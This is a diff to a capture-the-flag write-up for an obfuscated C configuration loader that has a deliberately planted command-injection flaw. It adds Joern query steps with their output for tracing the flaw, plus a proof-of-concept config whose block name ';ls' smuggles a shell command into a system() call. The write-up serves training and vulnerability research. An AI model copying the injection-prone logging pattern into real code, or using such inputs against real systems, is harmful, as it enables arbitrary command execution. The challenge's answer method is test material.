@@ -14,7 +14,9 @@ We implemented a web service, from which you can download a C program that imple
 The configuration loader parses and validates nginx configuration files.
 The configuration loader is a program that may read multiple config files and parses them and outputs one combined configuration.
 
-Somewhere hidden layers deep in this configuration loader, through a specially crafted config file a `system()` call may be executed with arbitrary user input. The flag is the function, which calls this `system()`.
+Somewhere hidden layers deep in this configuration loader, through a specially crafted config file a `system()` call may be executed with arbitrary user input.
+
+**The flag is the name of a function, which given a malicious configuration file, starts the chain to execute arbitrary shell commands.**
 
 The challenge is that the C code is obfuscated randomly per download and the flag needs to be entered within 60 seconds in the web service. Thus, manual search through the code is not possible.
 
@@ -51,34 +53,215 @@ The user has then a time window of 60 seconds to analyze the code and return the
 
 
 ### Solution Path
-The intended solve path is to understand the program generally and find the vulnerability, even though the timer of 60 seconds has then long run out. Next, the attacker should write a `joern` rule, which can find the attack path, i.e. the vulnerable function's name, regardless of obfuscation.
 
-Executing the `joern` rule on top of a newly downloaded and obfuscated version of the program allows the attacker to find the vulnerable function's name within 60 seconds and solve the challenge by entering the name into the web service.
+The intended solve path is to understand the program generally and find the vulnerability, even though the timer of 60 seconds has then long run out. Next, the attacker should write a `joern` script, which can find the attack path, i.e. the vulnerable function's name, regardless of obfuscation.
+
+Executing the `joern` script on top of a newly downloaded and obfuscated version of the program allows the attacker to find the vulnerable function's name within 60 seconds and solve the challenge by entering the name into the web service.
 
 Finding the right function name can be achieved by running following commands:
 
-1. Start joern in the directory of the unzipped code directory
-```joern```
-2. import the code by typing into the joern shell:
+1. Load the configloaders code using Joern
 
-```sc
-importCode(inputPath=".", projectName="ctf")
 ```
-3. Define the source and sink:
-```sc
-def sink = cpg.call("sys_run")
-def source = cpg.call("open_cfg_file") 
+joern> importCode(inputPath=".", projectName="ctf")
+Using generator for language: NEWC: CCpgGenerator
+Creating project `ctf` for code at `.`
+[...]
+val res1: io.shiftleft.codepropertygraph.generated.Cpg = Cpg[Graph[6708 nodes]]
 ```
 
-4. Get the sinks which are reachable by these flows:
+2. Find the methods that end up flowing to `system()`
 
-```sc
-sink.reachableByFlows(source).p
+```                                                                             
+joern> cpg.call("system").method.name.l
+val res2: List[String] = List("sys_unsafe_run", "sys_unsafe_sanitize_run", "sys_unsafe_whitelist_run")
+                                                                                
+joern> cpg.call("sys_unsafe_run").method.name.l
+val res3: List[String] = List("sys_unsafe_vlog")
+                                                                                
+joern> cpg.call("sys_unsafe_vlog").method.name.l
+val res4: List[String] = List(
+  "sys_unsafe_log_lvl",
+  "sys_unsafe_log_info",
+  "sys_unsafe_log_debug",
+  "sys_unsafe_log_warning",
+  "sys_unsafe_log_error"
+)
 ```
 
-%TODO rest
+3. Find out that `"sys_unsafe_log_info"` directly prints a block name without sanitization. There are five different calls to that log function, but only one takes a user input string.
 
-%TODO (basti) ich muss das noch überarbeiten
+```
+joern> cpg.call("sys_unsafe_log_info")
+val res10: Iterator[io.shiftleft.codepropertygraph.generated.nodes.Call] = non-empty iterator
+                                                                                                                                                                                        
+joern> cpg.call("sys_unsafe_log_info").l
+val res11: List[io.shiftleft.codepropertygraph.generated.nodes.Call] = List(
+  Call(
+    argumentIndex = -1,
+    argumentLabel = None,
+    argumentName = None,
+    code = """sys_unsafe_log_info(
+                    "unterminated quoted token encountered during deserialization: EOF")""",
+    columnNumber = Some(value = 17),
+    dispatchType = "STATIC_DISPATCH",
+    dynamicTypeHintFullName = IndexedSeq(),
+    lineNumber = Some(value = 141),
+    methodFullName = "sys_unsafe_log_info",
+    name = "sys_unsafe_log_info",
+    offset = None,
+    offsetEnd = None,
+    order = 1,
+    possibleTypes = IndexedSeq(),
+    signature = "",
+    staticReceiver = None,
+    typeFullName = "void"
+  ),
+  Call(
+    argumentIndex = -1,
+    argumentLabel = None,
+    argumentName = None,
+    code = """sys_unsafe_log_info(
+                        "unterminated escape sequence encountered during deserialization: %c", ch)""",
+    columnNumber = Some(value = 21),
+    dispatchType = "STATIC_DISPATCH",
+    dynamicTypeHintFullName = IndexedSeq(),
+    lineNumber = Some(value = 157),
+    methodFullName = "sys_unsafe_log_info",
+    name = "sys_unsafe_log_info",
+    offset = None,
+    offsetEnd = None,
+    order = 1,
+    possibleTypes = IndexedSeq(),
+    signature = "",
+    staticReceiver = None,
+    typeFullName = "void"
+  ),
+  Call(
+    argumentIndex = -1,
+    argumentLabel = None,
+    argumentName = None,
+    code = "sys_unsafe_log_info(\"configuration deserialization completed successfully\")",
+    columnNumber = Some(value = 5),
+    dispatchType = "STATIC_DISPATCH",
+    dynamicTypeHintFullName = IndexedSeq(),
+    lineNumber = Some(value = 371),
+    methodFullName = "sys_unsafe_log_info",
+    name = "sys_unsafe_log_info",
+    offset = None,
+    offsetEnd = None,
+    order = 6,
+    possibleTypes = IndexedSeq(),
+    signature = "",
+    staticReceiver = None,
+    typeFullName = "void"
+  ),
+  Call(
+    argumentIndex = -1,
+    argumentLabel = None,
+    argumentName = None,
+    code = "sys_unsafe_log_info(\"%s\", block_name)",
+    columnNumber = Some(value = 5),
+    dispatchType = "STATIC_DISPATCH",
+    dynamicTypeHintFullName = IndexedSeq(),
+    lineNumber = Some(value = 43),
+    methodFullName = "sys_unsafe_log_info",
+    name = "sys_unsafe_log_info",
+    offset = None,
+    offsetEnd = None,
+    order = 3,
+    possibleTypes = IndexedSeq(),
+    signature = "",
+    staticReceiver = None,
+    typeFullName = "void"
+  ),
+  Call(
+    argumentIndex = -1,
+    argumentLabel = None,
+    argumentName = None,
+    code = "sys_unsafe_log_info(\"filesystem_close: closed handle=%p\", (void*)file)",
+    columnNumber = Some(value = 5),
+    dispatchType = "STATIC_DISPATCH",
+    dynamicTypeHintFullName = IndexedSeq(),
+    lineNumber = Some(value = 91),
+    methodFullName = "sys_unsafe_log_info",
+    name = "sys_unsafe_log_info",
+    offset = None,
+    offsetEnd = None,
+    order = 5,
+    possibleTypes = IndexedSeq(),
+    signature = "",
+    staticReceiver = None,
+    typeFullName = "void"
+  )
+)
+```
+
+4. Enter the calling functions name `"configfile_serialize"` as flag on the website. Note that of course the files and function names are obfuscated, so the flag is a random string and not "configfile_serialize".
+
+```
+joern> cpg.call("sys_unsafe_log_info").method.l
+val res13: List[io.shiftleft.codepropertygraph.generated.nodes.Method] = List(
+  [...]
+  Method(
+    astParentFullName = "configfile_serialize.c:<global>",
+    astParentType = "TYPE_DECL",
+    code = """static int serialize_block(config_block* block, int indent_level, FILE* stream) {
+    const char* block_name = config_block_get_name(block);
+    /* HERE HERE HERE HERE HERE HERE HERE */
+    sys_unsafe_log_info("%s", block_name);
+    int is_not_main = strncmp(block_name, "main", sizeof("main"));
+    int in_context_indent = is_not_main ? indent_level + 1 : indent_level;
+
+   [...]
+  ),
+  [...]
+)
+```
+
+#### Additional information
+
+The vulnerability can be triggered, when running the program in verbose mode only, given a specially crafted config file as in the following.
+
+A block needs to be named a quoted shell command, which ends the intended `system()` call with a semicolon:
+
+```
+http {
+    ";ls" {   
+    }
+}
+```
+
+Example output:
+
+```
+./configloader -v test/insecure.cfg 
+Di 26. Mai 14:48:43 CEST 2026
+Linux heast 6.17.0-29-generic #29~24.04.1-Ubuntu SMP PREEMPT_DYNAMIC Mon May 11 10:30:58 UTC 2 x86_64 x86_64 x86_64 GNU/Linux
+[INFO] Output File: -
+[INFO] Input 1: test/insecure.cfg
+[DEBUG] filesystem_open: path='test/insecure.cfg', mode='r'
+[INFO] opened path='test/insecure.cfg' with mode='r'
+[DEBUG] parsing statement starting with 'http'
+[DEBUG] parsing statement starting with ';ls'
+[INFO] configuration deserialization completed successfully
+[DEBUG] serializing configuration
+[INFO] main
+[INFO] http
+http {
+[INFO]
+build                     configfile_deserialize.h  configfile_merge.h      filesystem.c  joern_example.md  printer.c  system.h
+cli.c                     configfile_easy.c         configfile_serialize.c  filesystem.h  logger.c          printer.h  sysunsafe.c
+cli.h                     configfile_easy.h         configfile_serialize.h  fs_low.c      logger.h          readme.md  sysunsafe.h
+configfile.c              configfile.h              configloader            fs_low.h      main.c            sysinfo.c  test
+configfile_deserialize.c  configfile_merge.c        expl01t.txt             fsops.h       Makefile          sysinfo.h  workspace
+    ;ls {
+    }
+}
+[INFO] filesystem_close: closed handle=0x7f8b8bc045c0
+[INFO] filesystem_close: closed handle=0x5cc746d145e0
+```
+
 
 
 ### Knowledge needed for this challenge
